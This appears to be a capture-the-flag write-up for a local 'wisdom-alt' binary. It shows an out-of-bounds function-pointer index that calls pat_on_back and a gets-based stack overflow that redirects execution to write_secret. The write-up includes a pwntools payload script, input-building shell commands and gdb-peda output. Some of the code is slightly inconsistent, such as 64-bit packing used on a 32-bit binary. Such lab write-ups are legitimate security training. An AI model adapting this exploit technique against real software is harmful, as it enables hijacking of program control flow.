# Buffer Overflow Challenge

## Procedure

### PAT_ON_BACK

First of all I studied the code and tried to understand almost everything. One of the things in which I had to pay more atention was the *atoi* function. Once everything was understood,
the idea was to input a number that instead of being 1 or 2 which were associated with functions *get_wisdom* (address 0x56559098) and *put_wisdom* (address 0x5655909c), input a number
which goes beyond this addresses and reaches the *pat_on_back* address which is loaded on the stack (addresss 0xffffd24c). 

With that objective in mind, we need to calculate the number to input in order to reach the function on the stack. For that purpose we need to substract → address of *pat_on_back* 
on stack - first address of array of functions → 0xffffd24c - 0x56559094 = 0xA9AA41B8 = 2846507448

That result needs to be divided by 4 in order to get the real value of the array → 2846507448/4 = 711626862

So, the input to introduce in order to execute *pat_on_back* is: **711626862**

### WRITE_SECRET

The possible vulnerability is located at the *gets* function on the put_wisdom method. For that reason, we are going to 
pay special attention and try to execute a buffer overflow
on it; changing the return address to the one of the function desired to execute → *write_secret* (0x565562AD).

First, we need to find the offset of the EIP (which controls the flow of a program and tells the computer where to go next 
to execute the next command). For that purpose, we execute 
the Bruijn cyclic sequence and *pattern_search* on the GDB to get the offset:
```
EIP+0 found at offset: 152
```
Now that we know that the offset is 152, we create the payload to inject into the program. For that, we use *pwntools*:
```
from pwn import *
context.arch='amd64'
context.os='linux'

# Return address in little-endian format
ret_addr = 0x565562AD
addr = p64(ret_addr, endian='little')
# Opcode for the NOP instruction
nop = asm('nop', arch="amd64")
# Writes payload on a file
payload =  nop*151 + addr
print (payload)
with open("./shellcode_payload", "wb") as f:
	f.write(payload)
```

This small program just creates a binary file which used as input, it  fills the buffer with NOP operations until the desired offset is reached and the address of *write_secret* is added.  
             
Then, the following script has been used to automate the build of the whole operation:
```
python ./buf_code.py
wc -c malicious_payload 
python -c 'import sys; sys.stdout.write("2\n"+"A"*1022)' > payload_search
cat shellcode_payload >> payload_search
cat payload_search
```
Now, on *payload_search* we have the input for the first read of the program, and the malicious payload (malicious_payload) for the second read (gets).

Finally, we just execute it on the gdb:

1. We put a breakpoint on line 30
2. We execute program with *payload_search* input:
```
run < payload_search
```
We can see that *write_secret* is executed and "secret key" is printed:
```
gdb-peda$ run < payload_search 
Starting program: /home/kali/Desktop/Challenges/BufferOverflow/wisdom-alt/wisdom-alt < payload_search
Hello there
1. Receive wisdom
2. Add wisdom
Selection >Enter some wisdom
secret key[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0x56558fbc --> 0x3ec4 
ECX: 0x56559084 ("secret key")
EDX: 0xb ('\x0b')
ESI: 0xf7fb5000 --> 0x1dfd6c 
EDI: 0x90909090 
EBP: 0xffffce8c --> 0x90909090 
ESP: 0xffffce84 --> 0x90909090 
EIP: 0x565562df (<write_secret+50>:     nop)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562d5 <write_secret+40>:        mov    ebx,eax
   0x565562d7 <write_secret+42>:        call   0x56556140 <write@plt>
   0x565562dc <write_secret+47>:        add    esp,0x10
=> 0x565562df <write_secret+50>:        nop
   0x565562e0 <write_secret+51>:        mov    ebx,DWORD PTR [ebp-0x4]
   0x565562e3 <write_secret+54>:        leave  
   0x565562e4 <write_secret+55>:        ret    
   0x565562e5 <pat_on_back>:    endbr32
[------------------------------------stack-------------------------------------]
0000| 0xffffce84 --> 0x90909090 
0004| 0xffffce88 --> 0x90909090 
0008| 0xffffce8c --> 0x90909090 
0012| 0xffffce90 --> 0x0 
0016| 0xffffce94 --> 0x41414100 ('')
0020| 0xffffce98 ('A' <repeats 200 times>...)
0024| 0xffffce9c ('A' <repeats 200 times>...)
0028| 0xffffcea0 ('A' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, write_secret () at wisdom-alt.c:30
warning: Source file is more recent than executable.
30        return;
gdb-peda$ 
```
